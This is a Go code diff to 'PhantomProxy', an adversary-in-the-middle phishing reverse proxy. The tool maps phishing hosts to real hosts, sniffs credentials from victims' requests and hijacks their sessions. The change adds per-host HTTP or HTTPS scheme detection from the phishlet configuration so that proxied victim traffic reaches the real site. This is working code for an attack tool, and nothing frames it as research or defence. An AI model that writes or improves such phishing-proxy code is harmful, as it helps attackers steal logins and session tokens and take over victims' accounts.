@@ -28,10 +28,16 @@ type PhantomProxy struct {
 	sessSniff  *capture.SessionHijacker
 	phishDomain string
 	hostMap    map[string]string // phish_host → real_host
+	hostSSL    map[string]bool   // phish_host → is_ssl
 }
 
 // NewPhantomProxy creates a new AiTM reverse proxy
 func NewPhantomProxy(cfg *config.Config, p *phishlet.Phishlet, s *store.Store) *PhantomProxy {
+	hostSSL := make(map[string]bool)
+	for _, h := range p.ProxyHosts {
+		phishHost := h.PhishSub + "." + cfg.Domain
+		hostSSL[phishHost] = h.IsSSL
+	}
 	pp := &PhantomProxy{
 		config:      cfg,
 		phishlet:    p,
@@ -40,6 +46,7 @@ func NewPhantomProxy(cfg *config.Config, p *phishlet.Phishlet, s *store.Store) *
 		sessSniff:   capture.NewSessionHijacker(s, p),
 		phishDomain: cfg.Domain,
 		hostMap:     p.GetHostMappings(cfg.Domain),
+		hostSSL:     hostSSL,
 	}
 	return pp
 }
@@ -76,8 +83,14 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 		go pp.credSniff.InspectRequest(req, bodyBytes, victimID)
 	}
 
-	// Build the target URL
+	// Build the target URL — detect scheme from phishlet config
 	scheme := "https"
+	hostKey := strings.Split(req.Host, ":")[0]
+	if isSSL, ok := pp.hostSSL[req.Host]; ok && !isSSL {
+		scheme = "http"
+	} else if isSSL, ok := pp.hostSSL[hostKey]; ok && !isSSL {
+		scheme = "http"
+	}
 	targetURL, _ := url.Parse(fmt.Sprintf("%s://%s", scheme, realHost))
 
 	// Create the reverse proxy
